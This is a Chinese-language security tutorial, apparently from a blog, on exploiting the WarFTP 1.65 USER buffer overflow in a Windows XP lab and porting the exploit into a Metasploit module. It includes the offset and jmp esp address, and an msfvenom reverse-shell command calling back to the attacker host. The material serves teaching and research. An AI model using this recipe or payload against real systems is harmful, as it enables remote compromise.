> 原文链接: https://www.anquanke.com//post/id/150202 


# metasploit模块移植/开发--python篇


                                阅读量   
                                **181182**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">6</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t01b4afa401314abdc8.jpg)](https://p2.ssl.qhimg.com/t01b4afa401314abdc8.jpg)

## 前言

近期因小弟个人情况，更新比较慢，望见谅。第一篇文章中我们介绍了metasploit神器的基本情况，现在开始我们进入正题，开始学习漏洞分析调试并开发移植的工作，希望通过本系列课程大家都能学会编写/移植MSF的模块。



## 准备环境/工具
1. 攻击主机： parrot os （小伙伴们可以使用kaili） iP: 192.168.0.159
1. windows xp sp3 IP: 192.168.0.110
1. metasploit
1. Immunity Debugger
1. mona 插件
<li>存在漏洞软件：WarFTP 1.65 （下载地址：[https://pan.baidu.com/s/1xrU2kqUmBH0yhQswk5plCQ](https://pan.baidu.com/s/1xrU2kqUmBH0yhQswk5plCQ) ）<br>[![](https://p1.ssl.qhimg.com/t013b541e647624276d.png)](https://p1.ssl.qhimg.com/t013b541e647624276d.png)
</li>


## 漏洞分析

下面我们开始漏洞分析调试工作，因为是第一篇我们先来个简单的分析一下，通过漏洞公布的信息可以知道，该FTP软件的“USER”处存在缓冲区溢出漏洞。现在我们来研究复现一下，我们先把这个软件拉到Immunity Debugger里按‘F9’运行看一下：<br>[![](https://p2.ssl.qhimg.com/t01b056c7ed6cb7cab8.png)](https://p2.ssl.qhimg.com/t01b056c7ed6cb7cab8.png)

程序已经正常运行，我们点击FTP软件上左上角的火箭小按钮开启FTP服务<br>[![](https://p5.ssl.qhimg.com/t0177fe109805e3ebbf.png)](https://p5.ssl.qhimg.com/t0177fe109805e3ebbf.png)

下面我们使用nmap 探测一下，看FTP服务是否正常开启<br>[![](https://p2.ssl.qhimg.com/t014c8bd977e5d13161.png)](https://p2.ssl.qhimg.com/t014c8bd977e5d13161.png)

可以看到21端口正常开启，服务名称为“WAR-FTPD 1.65”。<br>
那么一切准备就绪，我们就开始我们的fuzzing之旅吧！！<br>
我们先验证一下漏洞是否正式存在，先编写个小脚本验证一些，因为这篇是python篇，所以小弟用python脚本来完成这个工作，代码如下：

[![](https://p3.ssl.qhimg.com/t019fb96b7439dedf19.png)](https://p3.ssl.qhimg.com/t019fb96b7439dedf19.png)

保存脚本并运行<br>[![](https://p1.ssl.qhimg.com/t017e92ba43b9a73413.png)](https://p1.ssl.qhimg.com/t017e92ba43b9a73413.png)

脚本成功运行，并打印出我们想要打印的内容（为什么我要让他打印出接收到的内容哪，后面我们会说的），现在我们看一下靶机内的软件，已经按照正常预想的那样崩溃了，说明的我们的实验成功了，如图：<br>[![](https://p3.ssl.qhimg.com/t01ad81954172846c3e.png)](https://p3.ssl.qhimg.com/t01ad81954172846c3e.png)

细心的小伙伴肯定看到了，ESP、EBP 都出现了一大堆“A”，而EIP 是”0x41414141”。<br>
至于这3个分别代表什么意思呢，相信聪明的你因为会去google一下了解，因不是本系列的重点小弟在这里就不多细讲了。<br>
下面我们的工作是找到该程序溢出的值，我们可以使用metasploit下的一个小工具完成地址为：**“/usr/share/metasploit-framework/tools/exploit/pattern_create.rb”**<br>
切换到该目录下输入命令：./pattern_create.rb -l 1000<br>[![](https://p3.ssl.qhimg.com/t01ca072a4a93340f45.png)](https://p3.ssl.qhimg.com/t01ca072a4a93340f45.png)

可以看到程序自动给我们生成了1000个字母数字并均不重复，下面我们将这些字符复制到上面的脚本中，重新执行看看会发生什么（此处记得把FTP程序也重启一下）<br>[![](https://p5.ssl.qhimg.com/t01d68e6e0f21a6d5af.png)](https://p5.ssl.qhimg.com/t01d68e6e0f21a6d5af.png)

可以看到程序还是崩溃了，但是此时的EIP变成了“0x32714131”,这说明我们的工作都是有意义的，下面我们继续使用msf下的 “pattern_offset.rb”工具来查找他的偏移数，如图：<br>[![](https://p2.ssl.qhimg.com/t01634ba454d173af97.png)](https://p2.ssl.qhimg.com/t01634ba454d173af97.png)

可以看到已经帮我找到偏移位为“485” （记录一下，后面我们用得到！）<br>
下一步我们来验证一下这个偏移位置是否是正确的，这个非常重要，我们修改一下python脚本并运行，如图：<br>[![](https://p3.ssl.qhimg.com/t01f31967a2f9c109b2.png)](https://p3.ssl.qhimg.com/t01f31967a2f9c109b2.png)

[![](https://p5.ssl.qhimg.com/t01d208f8abb7c73765.png)](https://p5.ssl.qhimg.com/t01d208f8abb7c73765.png)

可以看到现在EIP地址变成了“0x46464646” 即“F”字母的16进制，而EBP栈底地址也变成了“CCCC”，这说明我们的偏移地址是正确的。<br>
下面我们就来查找程序所调用的dll文件来控制EIP，让其跳转到我们想要执行的恶意shellcode，我们先查找dll文件，这里的方法很多，本次小弟使用的方法是：<br>
打开Immunity Debugger — view — Executable modules<br>
软件自动帮我们列出了该程序所调用的所有dll文件，如图：<br>[![](https://p5.ssl.qhimg.com/t01a25df24a613a24ed.png)](https://p5.ssl.qhimg.com/t01a25df24a613a24ed.png)

下面呢小弟选择最下面的 shell32.dll 作为本次实验的dll文件，选择它后双击2下，即进入了该dll代码块，我们使用快捷键 “ctrl+f”来搜索关键字 “jmp esp” （如无也可以使用call esp），可以看到程序已经帮我找到了一处调用点，地址为：0x7D711020。（记录一下这个地址）**（这里强调一点，因为操作系统的不同每个JMP地址也会不一样，该地址本菜这里能用不代表您的系统就能使用！！！）**如图：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01a02d0a387217cfcd.png)

下一步我们需要一个shellcde，这里我们可以使用msfvenom来帮我们完成这个工作，命令：msfvenom -p windows/shell_reverse_tcp rhost=192.168.0.159 lport=5555 -b “x00x0ax0dx40x20” -f python -v shellcode

[![](https://p5.ssl.qhimg.com/t01a297bb64e043de26.png)](https://p5.ssl.qhimg.com/t01a297bb64e043de26.png)

最后我们修改一下那个python脚本，如图：<br>[![](https://p0.ssl.qhimg.com/t010d3d03a2f94d6e52.png)](https://p0.ssl.qhimg.com/t010d3d03a2f94d6e52.png)

下面介绍一下代码：<br>
第5行到第35行shellcode代码区（执行反弹命令）<br>
第37行代码前面一段为485个A 用来填充内存，“7D711020”为上面找到了jmp esp地址，因为是小端显示故是要反着写为“x20x10x71x7D”, 后面跟着20个“C”，为了防止我们的shellcode被覆盖，最后跟上我们的shellcode。<br>
最后的第43行代码上面解释过了把拼接好的数据发送给FTP服务器并打印。（**注意：“USER” 后面要跟上一个空格，否则漏洞将无法执行，这也就是我们上面要让代码打印出接收到的数据一样，可以看到“user name”中间是有一个空格的！**）。

下面我们执行这个python脚本,并在攻击机器上运行nc来接收靶机的反弹，如图：<br>[![](https://p3.ssl.qhimg.com/t015d75fb26ccabc0d2.png)](https://p3.ssl.qhimg.com/t015d75fb26ccabc0d2.png)

可以看到我们已经通过远程缓冲区溢出漏洞成功拿下了目标电脑！！<br>
你以为文章这样就结束了吗？ NONONO 我们的重点才刚要开始！



## 模块移植

可能小伙伴们在网上看到的EXP就如上面的代码那样，但是如果我们在真实的渗透环境中碰到大型的网络环境下，多台机器存在该漏洞呢，难道也这样一个个接收吗？那我们就需要把该利用脚本移植到MSF来了。下面我们就学习怎么移植一个EXP到metasploit吧，我们可以使用“mona.py”插件来减少工作量，下载地址：[https://github.com/corelan/mona](https://github.com/corelan/mona)

安装好以后纳，我们在Immunity Debugger下 输入 “!mona skeleton” 回车<br>[![](https://p3.ssl.qhimg.com/t016f8602f52c3bad22.png)](https://p3.ssl.qhimg.com/t016f8602f52c3bad22.png)弹出一个窗口，通过下拉选择 TCP，然后点OK<br>[![](https://p3.ssl.qhimg.com/t01328c0cb53ec8ae47.png)](https://p3.ssl.qhimg.com/t01328c0cb53ec8ae47.png)因为是21端口，所以我们就输入21，继续点OK<br>
最后该插件自动帮我们生成了一个名为 “msfskeleton.rb”的文件，我们打开看一下<br>
如图：<br>[![](https://p5.ssl.qhimg.com/t016442e72fc1ab63f2.png)](https://p5.ssl.qhimg.com/t016442e72fc1ab63f2.png)

[![](https://p4.ssl.qhimg.com/t01e58466c88e51ef1c.png)](https://p4.ssl.qhimg.com/t01e58466c88e51ef1c.png)

ruby的代码讲解小弟在上一篇文章，下面我们的工作就比较简单了，只需要填空就行。<br>[![](https://p1.ssl.qhimg.com/t0116ca5867881eb7f4.png)](https://p1.ssl.qhimg.com/t0116ca5867881eb7f4.png)

[![](https://p5.ssl.qhimg.com/t0194bc9db210adec15.png)](https://p5.ssl.qhimg.com/t0194bc9db210adec15.png)如图中是小弟修改好的代码，小弟挑出几个比较重要的地方给大家说明一下，
1. 第9行代码处 表示引用了“/usr/share/metasploit-framework/lib/msf/core/exploit/ftp.rb”，很多FTP的方法都已经在那个文件内被定义好了，我们只需要调用就行。
1. 第33行代码处表示我们是在windows平台; 34行代码可以不设置也可以直接写入指定payload.
1. 第36行代码表示写入需要过滤的一些坏字节
1. 第44行代码是我们在调试时发现是jmp esp地址（上面有记录），方便下面调用
<li>第63行代码开始就是我们的EXP，ruby中的“&lt;&lt;” 等于 python 中的 “+=”， 如图做个演示<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0155b024c6e0d28c59.png)
</li>
如果不敢确定代码是否写对了，可以使用“/usr/share/metasploit-framework/tools/dev/msftidy.rb”验证一下，如图：<br>[![](https://p3.ssl.qhimg.com/t014547801262f3ceea.png)](https://p3.ssl.qhimg.com/t014547801262f3ceea.png)

最后我们来验证一下这个代码是否真的可用，如图：<br>[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t011a89cd717c658e8b.png)

可以看到我们已经成功通过自己写的模块入侵了靶机。



## 结束

小弟非专业码农，写代码习惯可能不好，没写注释啥的。请各位大佬别见怪！如果文章哪里写的不对，还请大家斧正。最后祝大家生活愉快，工作顺心！！

审核人：yiwang   编辑：边边
